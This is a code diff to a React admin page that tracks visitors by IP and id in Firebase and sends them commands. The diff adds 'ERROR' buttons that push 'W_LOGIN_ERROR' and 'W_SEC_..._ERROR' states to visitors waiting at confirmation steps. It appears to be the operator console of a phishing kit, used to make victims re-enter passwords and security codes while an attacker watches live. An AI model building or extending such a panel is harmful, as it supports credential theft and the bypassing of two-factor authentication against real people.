@@ -69,11 +69,6 @@ export default function PanelPage() {
     }
   }, [dataInfoString]);
 
-  // const handleLoginError = (id: string) => {
-  //   const infoRef = ref(database, `info/${id}`);
-  //   update(infoRef, { command: "LOGIN_ERROR" });
-  // };
-
   const handleCommand = (cmd: string, ip: string, id: string) => {
     const infoRef = ref(database, `info/${ip}/${id}`);
     update(infoRef, { command: cmd });
@@ -208,8 +203,33 @@ export default function PanelPage() {
                           "N/A"
                         )}
                       </td>
-                      <td className="px-6 py-4 font-medium text-base text-white text-center">
-                        {data.command}
+                      <td className="px-6 py-4 flex flex-row gap-2 font-medium text-base text-white text-center">
+                        {data.command === "W_LOGIN_CONFIRM" ? (
+                          <>
+                            <button
+                              onClick={() =>
+                                handleCommand("W_LOGIN_ERROR", ip, id)
+                              }
+                              className="flex bg-zinc-400 py-2 px-4 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
+                            >
+                              ERROR
+                            </button>
+                          </>
+                        ) : data.command.includes("W_SEC") &&
+                          data.command.includes("CONFIRM") ? (
+                          <>
+                            <button
+                              onClick={() => {
+                                const ref = data.command.split("_")[2];
+                                const code = `W_SEC_${ref}_ERROR`;
+                                handleCommand(code, ip, id);
+                              }}
+                              className="flex bg-zinc-400 py-2 px-4 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
+                            >
+                              ERROR
+                            </button>
+                          </>
+                        ) : null}
                       </td>
                     </tr>
                   );
